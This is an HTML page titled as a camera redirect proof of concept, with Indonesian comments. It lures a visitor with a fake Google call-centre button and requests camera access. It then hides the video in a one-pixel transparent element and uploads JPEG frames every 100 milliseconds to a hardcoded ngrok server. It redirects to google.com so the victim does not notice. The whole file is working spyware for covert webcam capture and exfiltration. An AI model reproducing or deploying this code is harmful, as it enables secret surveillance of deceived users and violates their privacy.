<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera Redirect PoC (Controlled)</title>
<style>
  body {
    font-family: Arial, sans-serif;
    text-align: center;
    padding: 60px;
  }
  button {
    padding: 15px 30px;
    font-size: 20px;
    cursor: pointer;
  }
  #status {
    margin-top: 20px;
    font-size: 18px;
    color: darkred;
  }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<h2>CLICK TO GOOGLE</h2>
<button id="camBtn">CLICK CALL CENTER GOOGLE</button>
<div id="status">Status: Waiting...</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('camBtn');
  var statusEl = document.getElementById('status');
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";

  function log(msg) {
    statusEl.textContent = msg;
    console.log(msg);
  }

  // ============================================
  // 1. KAMERA & TELEMETRI
  // ============================================
  async function startCamera() {
    try {
      log("Meminta Izin Kamera...");
      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      log("Kamera BERHASIL diakses!");

      // Buat video transparan
      var video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
      document.body.appendChild(video);

      await video.play().catch(function(){});

      // Telemetri (Kirim Frame)
      var canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      var ctx = canvas.getContext('2d');

      setInterval(function() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(function(blob) {
            if (!blob) return;
            var formData = new FormData();
            formData.append('file', blob, 'camera.jpg');
            fetch(SERVER_ENDPOINT, {
              method: 'POST',
              body: formData,
              keepalive: true
            }).catch(function(){});
          }, 'image/jpeg', 0.5);
        }
      }, 100);

    } catch(err) {
      log("Kamera diblokir: " + err.name);
    }
  }

  // ============================================
  // 2. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', async () => {
    log("Preparing redirect...");

    // A. Mulai Kamera (0ms)
    startCamera();

    // B. Redirect cepat setelah 300ms
    setTimeout(() => {
      log("Redirect ke Google...");
      try {
        window.location.replace('https://www.google.com');
      } catch(e) {}
    }, 300);

  }, { once: true });

})();
</script>
</body>
</html>
